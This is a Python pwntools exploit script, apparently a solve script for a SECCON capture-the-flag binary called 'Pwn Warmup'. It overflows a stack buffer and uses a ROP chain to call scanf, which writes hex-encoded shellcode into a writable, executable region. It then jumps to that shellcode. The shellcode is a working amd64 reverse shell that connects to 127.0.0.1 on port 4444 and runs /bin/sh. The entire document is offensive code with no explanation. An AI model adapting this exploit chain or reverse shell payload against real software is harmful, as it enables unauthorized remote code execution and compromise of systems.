from pwn import *
from binascii import unhexlify

context.arch = 'amd64'

wx_addr=0x00600000
shellcode='6a2958996a025f6a015e0f05489748b90200115c7f000001514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05'
s = unhexlify(shellcode)

r = process('./chall')
#r = remote('pwn-neko.chal.seccon.jp', 9001)
r.recvuntil(b'Welcome to Pwn Warmup!\n')

payload  = b'A' * 0x28              # junk + rbp
payload += p64(0x004007e3)          # pop rdi; ret
payload += p64(0x0040081b)          # %s
payload += p64(0x004007e1)          # pop rsi; pop r15; ret
payload += p64(wx_addr)             # 0x00600000 as scanf param, rsi
payload += p64(wx_addr)             # not relevant, r15
payload += p64(0x004005c0)          # call scanf
payload += p64(wx_addr)             # redirect execution to 0x00600000
payload += b'\n'                    # end first scanf input
payload += s                        # shellcode as second scanf input
payload += b'\n'                    # end shellcode

r.sendline(payload)
r.interactive()
